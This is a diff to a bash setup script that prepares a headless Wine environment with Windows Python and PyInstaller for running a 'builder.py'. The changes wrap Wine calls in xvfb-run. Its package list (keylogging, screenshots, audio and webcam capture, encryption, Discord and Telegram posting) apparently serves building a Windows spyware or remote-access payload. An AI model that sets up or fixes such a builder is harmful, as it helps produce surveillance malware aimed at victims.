@@ -33,7 +33,11 @@ pip3 install -r requirements.txt --quiet --break-system-packages || pip3 install
 # 4. Initialize Wine Prefix
 WINE_DIR="$USER_HOME/.wine"
 export WINEPREFIX="$WINE_DIR"
-export WINEARCH=win32 # 32-bit is more stable for these tools
+export WINEARCH=win32
+export WINEDEBUG=-all
+export DISPLAY=:0
+# Use a dummy X server if needed, but for now we'll try to force headless
+
 
 if [ ! -d "$WINE_DIR" ]; then
     echo "[+] Initializing 32-bit Wine prefix..."
@@ -49,7 +53,7 @@ sudo chown -R $(whoami):$(whoami) "$WINE_DIR" || true
 # 6. Install MSVC Runtimes (Fixes c0000135 STATUS_DLL_NOT_FOUND)
 echo "[+] Installing MSVC runtimes via winetricks..."
 # We use -q for quiet mode and handle potential winetricks errors
-winetricks -q vcrun2015 || echo "[!] Winetricks failed to install vcrun2015, but continuing..."
+xvfb-run -a winetricks -q vcrun2015 || echo "[!] Winetricks failed to install vcrun2015, but continuing..."
 
 # 7. Install Python in Wine
 WINE_PYTHON_DIR="C:\\Python38"
@@ -60,7 +64,7 @@ if [ ! -f "$WINE_PYTHON_EXE" ]; then
     wget -q -O python-3.8.10.exe https://www.python.org/ftp/python/3.8.10/python-3.8.10.exe
 
     echo "[+] Installing Python in Wine to $WINE_PYTHON_DIR..."
-    wine python-3.8.10.exe /quiet InstallAllUsers=1 TargetDir="$WINE_PYTHON_DIR"
+    xvfb-run -a wine python-3.8.10.exe /quiet InstallAllUsers=1 TargetDir="$WINE_PYTHON_DIR"
     
     # Wait for installation
     echo "[*] Waiting for Python installation to complete..."
@@ -77,8 +81,8 @@ fi
 
 # 8. Install Windows-side Python Dependencies
 echo "[+] Installing Windows-side Python dependencies via Wine..."
-wine "$WINE_PYTHON_EXE" -m pip install --upgrade pip --quiet
-wine "$WINE_PYTHON_EXE" -m pip install pyinstaller==5.3 pillow pyscreeze pyautogui psutil keyboard pywin32 pycryptodome discord_webhook discord.py opencv-python sounddevice scipy pyTelegramBotAPI PyGithub --quiet
+xvfb-run -a wine "$WINE_PYTHON_EXE" -m pip install --upgrade pip --quiet
+xvfb-run -a wine "$WINE_PYTHON_EXE" -m pip install pyinstaller==5.3 pillow pyscreeze pyautogui psutil keyboard pywin32 pycryptodome discord_webhook discord.py opencv-python sounddevice scipy pyTelegramBotAPI PyGithub --quiet
 
 echo "[+] Setup Complete!"
 echo "[*] You can now run: python3 builder.py"
